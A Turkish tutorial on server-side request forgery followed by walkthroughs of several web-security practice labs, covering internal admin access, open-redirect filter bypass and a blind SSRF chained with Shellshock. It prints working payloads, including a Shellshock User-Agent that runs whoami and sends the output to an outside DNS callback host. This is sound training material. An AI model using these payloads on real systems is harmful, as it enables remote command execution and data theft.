# 0x16 | Server-Side Request Forgery Nedir ?

# SSRF Nedir?

Günümüz web uygulamaları geçmişte geliştirilen web uygulamalarına göre mimarisel olarak farklıdır. Geçmiş zamanlarda geliştirilen web uygulamaları dış dünya ile herhangi bir iletişim kurmadan sadece veritabanına bağlanarak hayatını idame ettirirken günümüz web uygulamaları bunun tersine dış dünya ile bağlantı kurar, mikroservisler ile iletişim halindedir. 

Bizim için application security’de en önemli şeylerden biri INPUT’tur. Çünkü kontrol edebildiğiniz bir nokta yoksa atak vektörleri de oluşmamaktadır. Doğrudan ya da dolaylı yoldan her zaman input’a ihtiyacınız vardır. Input, uygulamanın bizden aldığı data’dır. Aldığı bu input ile arkaplanda birtakım işler yapmaktadır. 

SSRF konusu CSRF zafiyeti ile isim benzerliği taşımaktadır. Ancak bu konu ile bir alakası yoktur. Bugün bu yazıda ele alacağımız ve konuşacağımız konu SSRF (Server Side Request Forgery) zafiyetidir. 

Siber güvenlik ile ilgili konularda duyduğunuz terimlerden bu konunun ne ile alakalı olduğunu anlamaya çalışmanız sizin için faydalı olacaktır. Burada  ele aldığımız konu da SSRF olduğu için ismine bakacak olursak aklımıza sunucu taraflı istek sahteciliği gelebilir. Yani sunucunun bir isteği oluşması lazım, sunucunun bir kaynağa ürettiği bir istekten bahsediyoruz. Yani server’ın client gibi davrandığı noktaların tamamı demektir bu da. Merkezde bir application’ın olduğunu düşünürsek bu Third-party bir api’ye gidiyor veya birtakım farklı servislere erişim sağlıyor olabilir. Bu nedenle aklınıza backend’in client gibi davrandığı noktalar gelmeli. 

Şimdi SSRF konusunu  detaylı bir şekilde ele alalım. Karşımızda bir uygulama olduğunu ve bu uygulamanın bir external resource’a talepte bulunduğunu düşünelim. Günümüzde application’lar tek başına yaşamını sürdürmediği için burada uygulamanın bulunduğu sunucular bölgesinde başka sistemler de olabilir, yani microservice, database, elasticsearch, memcache gibi yapılar da yer alabilir. Siz dış dünyadan buraya request attığınızda sistem içerisindeki yapılara erişim sağlayamamaktasınız. Bunlar internal accessible yapıdadır. Ancak burada uygulamanın sizden bir URL aldığı ve bunun için bir HTTP request’i oluşturduğu bir feature (özellik) düşünün. Örneğin böyle bir feature’ın neden olacağını düşününce de aklımıza birçok örnek gelebilir; sizden aldığı url’deki bir resmi indirme gibi örnekler olabilir. Tam bu noktada giden bu request’i bir şekilde manipüle edip internal bir servise erişmesini sağlayabilirsek ne olur? işte SSRF’in başladığı nokta da burasıdır.  

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled.png)

# SSRF'e Farklı Bakışlar - XXE ile Benzerlik

Burada uygulamanın sizden URL aldığı durumları konuştuk ama aslında eski eğitimleri de hatırlayacak olursak uygulamanın sizden aldığı bir kaynağa erişmesinin feature olmadığı ama uygulamaya bu davranışı sergilettirebildiğiniz durumlar vardır. Örneğin uygulamanın bir feature’ında bir external resource’a request gönderdiği bir feature’ı sömürüyoruz. Ama başka bir zafiyeti kullanarak da SSRF davranışını sergilettirebildiğimiz durumlar mevcuttur.  

Blind SSRF konusu da mevcuttur. Yukarıdaki şekil üzerinden konuştuğumuz feature her zaman aynı davrnaışı sergilemiyor olabilir. Sunucu HTTP request’i external resource’a gönderip aldığı response’u size vermeyebilir her zaman. Aldığı bu response’u database’e kaydedebilir. Size response’u göstermediği durumlar da Blind SSRF diye bir konu da karşımıza çıkmaktadır. 

SSRF zafiyetini RCE (Remote Code Execution) ‘e çevirmek isteyebilirsiniz ancak bu, case’lerin çok az bir kısmında meydana gelen bir olaydır. RCE yapabilmek için her zaman başka zafiyete de ihtiyaç duyarsınız. 

Dolayısıyla karşımıza 2 tip SSRF zafiyeti çıkmaktadır. Biri size doğrudan response’u verirken diğeri bunu doğrudan vermemektedir. 

`XXE` zafiyetini hatırlayalım. XXE uygulamanın sizden `XML` alıp parse ettiği noktalarda meydana gelirdi. Ancak XXE’nin exploitation’ında (sömürüsünde) bir yöntem daha bulunmaktaydı; bu yönteme göre DTD (`Document Type Definition`) aracılığıyla EE (`External Entity`) tanımlayıp XML Parser’ın verdiğiniz bir URL’e request göndermesini sağlatabilmekteydiniz. SSRF ile benzer bir mantık bulunmaktadır dolayısıyla. 

# Lab: Basic SSRF against the local server

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%201.png)

Buradaki lab ortamında bizden `carlos` kullanıcısını silmemiz istenmektedir. Sisteme giriş yaptıktan sonra bir ürünün `check stock`  özelliğini kullanıp giden request’i inceleyelim. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%202.png)

Gönderilen request’i incelediğimizde uygulamanın bir URL’e istek gönderdiğini görmekteyiz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%203.png)

Decode ettiğimizde ise bu URL’in nasıl bir yapıda olduğunu görebiliriz. Burada yapmamız gereken şey lab ortamının bizden istediğini uygulayarak ilerlemek olacaktır. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%204.png)

Dolayısıyla `http://localhost/admin` URL’ine erişip erişmediğimizi kontrol ederek ilerleyebiliriz. Burada da görmüş olduğunuz üzere başarıyla ulaşabilmekteyiz. Aynı zamanda `carlos`  kullanıcısını silmek için de hangi adrese gitmemiz gerektiği ilgili a tag’inin href’inde verilmiş durumdadır. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%205.png)

Dolayısıyla bu request’i gönderdiğimizde `carlos`  kullanıcısını silerek lab ortamının bizden istediği görevi yerine getirmiş olmaktayız.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%206.png)

Ve lab ortamının başarıyla çözüldüğünü görebilirsiniz.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%207.png)

# Lab: Basic SSRF against another back-end system

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%208.png)

Buradaki lab ortamında ise kullanacağımız temel şey Burp Intruder ile verilen IP aralığında bize hangi IP adresinin nasıl bir sonuç getirdiğini incelemek olacaktır. Dolayısıyla tekrar bir ürünün `check stock`  özelliğini kullanınca oluşan request’i yakalayıp bunu Intruder’a göndermemiz gerekmektedir. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%209.png)

Burada verilen nokta için denemeler yaparak gelen response’ları incelemeliyiz.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2010.png)

Ardından payload tipimizi de sayılardan oluşacak şekilde ayarlayıp 1’den 255’e kadar deneyebileceğimiz bir yapı kurarak Intruder’ı başlatıyoruz.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2011.png)

Burada Intruder henüz çalışmasını bitirmemişken dikkatimizi çeken bir nokta görmekteyiz. Diğerrlerinin tersine 83 portu için bir sonuç bulunamadığı söylenmektedir. Bu da 83 portuna özel bir durum olduğu anlamına gelir. Path yanlış olduğu için bu şekilde response almaktayız. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2012.png)

Path olarak /admin verdiğimizde admin ile ilgili olan sayfanın geldiğini görebiliriz artık.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2013.png)

Lab ortamı bizden carlos kullanıcısını silmemizi istediği için bu işlemi gerçekleştiriyoruz. 

```python
stockApi=http://192.168.0.83:8080/admin/delete?username=carlos
```

Ve lab çözüldü…

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2014.png)

# Lab: Blind SSRF with out-of-band detection

Blind SSRF’te response’u göremeyiz. Bu lab ortamı da buna örnek olarak hazırlanan bir sistem içermektedir. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2015.png)

Tekrardan bir ürünü ziyaret ettiğimizde oluşan request’i inceleyelim. Bu request üzerinde referer ile ilgili bir değişiklik yapıp [google.com](http://google.com) verdiğimizde response’un geldiğini görmekteyiz. Yani burada google.com’a giden bir HTTP request’i olduğunu söyleyebiliriz. Dolayısıyla google.com yerine kendimize ait bir web sunucumuza istekte bulunabiliriz. Böylece dış dünyaya yönelik bir DNS talebinin çıktığını görüyoruz, DNS’in çözülmeye çalışıldığını söyleyebiliriz. Ancak Response bize gelmemektedir. Blind SSRF olduğu için böyle bir durum söz konusudur. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2016.png)

Dolayısıyla burada Burp Collabrator aracılığıyla bir istekte bulunup “pull now” yaptığımızda lab ortamı çözülmüş olacaktır. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2017.png)

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2018.png)

# Lab: SSRF with filter bypass via open redirection vulnerability

Bu lab ortamında ise uygulama sunucusunun HTTP Response’ta 302 redirection gördüğünde redirection’ı takip edip etmediğini simüle ettikleri bir durum söz konusudur. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2019.png)

Bir önceki yazıda application üzerindeki validation’lardan (doğrulamalardan) bahsetmiştik. Yani buradaki application aldığı URL üzerinde bir validation yapmaktadır. Ancak bu validation’ı hangi katmanda veya kaç şekilde yaptığını denemeden bilmemekteyiz. Örneğin URL olarak `http://localhost` verdiğimizde uygulama buraya doğrudan erişim sağlayamadığımızı söylemektedir. Ancak bu uygulamada bir Open Redirect zafiyeti bulursak, kendi kontrol ettiğimiz bir adrese redirection gerçekleşebilir. Bu durumda uygulamanın redirection’larda da kontrol yapıp yapmadığını tespit etmeliyiz. Bu lab ortamı özelinde de erişmemizi istedikleri yer `192.168.0.12:8080/admin`  adresidir. Bu adrese erişip `carlos`  kullanıcısını silmemiz gerekmektedir. 

Şimdi adım adım ilerleyip incelememiz gereken request’e erişelim. Öncelikle bir ürünün detaylarına gidelim;

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2020.png)

Ürün detaylarına gittikten sonra da `check stock`  özelliğini kullandıktan sonra oluşan request’i inceleyelim;

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2021.png)

Oluşan request’i incelediğimizde ise bizden full URL almak yerine bir endpoint aldığını görmekteyiz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2022.png)

Erişmek istediğimiz URL’e gitmeye çalıştığımızda böyle bir URL’in kabul edilmediğini görmekteyiz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2023.png)

Burada aradığımız şey aslında Open Redirection zafiyetidir. Burada hangi endpoint’te bu zafiyetin olduğunu bulmalıyız. 

Bunu düşünürken uygulamada bir sonraki ürüne gidebileceğimiz bir özellik bulunduğunu görüyoruz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2024.png)

Oluşan request’i de incelediğimizde aşağıdaki gibi olduğunu görebiliriz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2025.png)

Eğer burada `path`  üzerinde verdiğimiz değerde bir validation yoksa buraya istediğimiz şeyi yazarak ilerleyebiliriz. Dolayısıyla bizden erişmemizi istedikleri adresi yazıp erişmeye çalışabiliriz burada.  Bu uygulama `stocApi` parametresinde `path` ’e bakmaktadır. Ancak biz bu parametrede istediğimiz adrese redirection yaptırabilmekteyiz. Redirection aldığında kontrol etmediği için de istediğimiz hedefe ulaşmış oluyoruz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2026.png)

Dolayısıyla artık `carlos` kullanıcısını belirtilen URL ile silebiliriz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2027.png)

Ve lab ortamının başarıyla çözüldüğünü görebiliriz…

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2028.png)

# Lab: Blind SSRF with Shellshock exploitation

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2029.png)

Bu lab ortamında ilerlerken ihtiyacımız olabilecek bir Burp Extension’ı bulunmaktadır. Burp Suite Professional sürümü için geçerlidir. `Collabrator Everywhere` isimli bu extension sayesinde Burp Suite tüm request’leri manipüle eder. Tüm olası header alanlarının içerisinde her yere Burp Suite’in callback adresini yazmaktadır. Tüm header’lar için collabrator adresini yazarak bir cevap gelip gelmediğini kontrol etmektedir. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2030.png)

Lab ortamına geri dönecek olursak bizim zafiyetimiz büyük ihtimalle `referer`  alanındadır. Dolayısıyla buraya kendi collabrator adresimizi yazarak request’i gönderiyoruz ve gelen response’u inceliyoruz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2031.png)

Collabrator üzerinde baktığımızda da gelen sonuçlar bu şekildedir. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2032.png)

Burada ayrıca request üzerinde `User-Agent`alanını da değiştirdiğimizde collabrator’e geldiğini görmekteyiz. Bu duruma gerçek hayatta pek rastlanmasa da bu lab özelinde **Shellshock**’u uygulatabilmek için böyle bir senaryo oluşturulmuştur. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2033.png)

Değiştirdiğimiz değerin collabrator tarafında da geldiğini bu şekilde ispat edebiliriz. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2034.png)

Bu noktada artık **Shellshock** exploit’lerine bakmamız lazım. Kullanacağımız payload, lab ortamının da bizden istediği bilgileri elde edebileceğimiz bir şekilde olması gerektiğinden dolayı bu şekilde olmalıdır; 

```python
() { :; }; nslookup $(whoami).9r1gkbi8d28pf6aba2y65dutokubi26r.oastify.com
```

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2035.png)

Burada Burp Intruder aracılığıyla bize verilen IP aralığında hangi IP adresinin bir sonuç getirip getirmeyeceğinin testini de yapmış olmaktayız. Dolayısıyla burada 1’den 255’e kadar deneme yaparak doğru IP adresini bulup buradaki kullanıcı adını Collabrator’de yakalamış olacağız. 

Burada yaşanan olayı aslında şu şekilde açıklayabiliriz;

Client tarafından application’a gönderilen bir request üzerinden düşünelim. Application buradaki request’i aldığı zaman iç taraftaki bir analitik uygulaması `referer`’daki URL’e HTTP talebi gönderirken o talebin `User-Agent`’ına da bizden aldığı değeri yazmaktadır. Bu iki kısım (Referer ve User-Agent) bizim **Input** alanlarımızdır. Bu adrese gittikten sonra iç network’ü (`internal network`) taramaya başlamaktayız. Gittiğimiz bu iç network’teki web sunucularından biri de eski bir web sunucusudur ve Shellshock zafiyeti bulunmaktadır. Bu da User-Agent üzerinden tetiklenebilir. Burada da `nslookup` komutu ile o sunucuda `whoami` çıktısını bizim collabrator sunucumuz içerisinde bir subdomain olarak dışarı taşıtmaktayız. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2036.png)

Bu açıklamayı yaptıktan sonra da geri dönecek olursak burada Intruder ile yaptığımız denemede bir başarı elde edemedik. Dolayısıyla önce hangi web sunucusunun zafiyetli olduğunu tespit etmemiz daha sonra da buradan bilgi çıkarımı yapmamız gerekmektedir. 

Burada yazmamız gereken payload şu şekildedir;

```python
() { :; }; /usr/bin/nslookup $(whoami).iiqvmswbzrpcvswekawryb00mkrn5lfha.oast.fun

-------------------------------------------------------------------------
GET /product?productId=2 HTTP/2
Host: 0a19009b0424289883eb883000fb00c9.web-security-academy.net
Cookie: session=7a48GQPaJ004YQ4EYMBrBdZ1mfBrWIcI
Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: () { :; }; /usr/bin/nslookup $(whoami).lvkdg0my1mllm1w38os79x44hvnqbmzb.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://192.168.0.§1§:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

Bu sayede gönderdiğimiz request ile hedef sistemde istediğimiz bilgiyi elde etmiş bulunmaktayız. 

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2037.png)

Sonucu gönderdiğimizde ise artık lab ortamını çözmüş oluyoruz.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2038.png)

Bununla birlikte SSRF Lab’larının da tamamını çözmüş bulunduk.

![Untitled](0x16%20Server-Side%20Request%20Forgery%20Nedir%20d3c4b2ebcb764d66b80606cea77bf5a5/Untitled%2039.png)

# KAYNAKLAR

1. [https://www.youtube.com/watch?v=2ONduwyqYUA](https://www.youtube.com/watch?v=2ONduwyqYUA)
2. [https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb](https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb)
3. [https://blog.cloudflare.com/inside-shellshock](https://blog.cloudflare.com/inside-shellshock)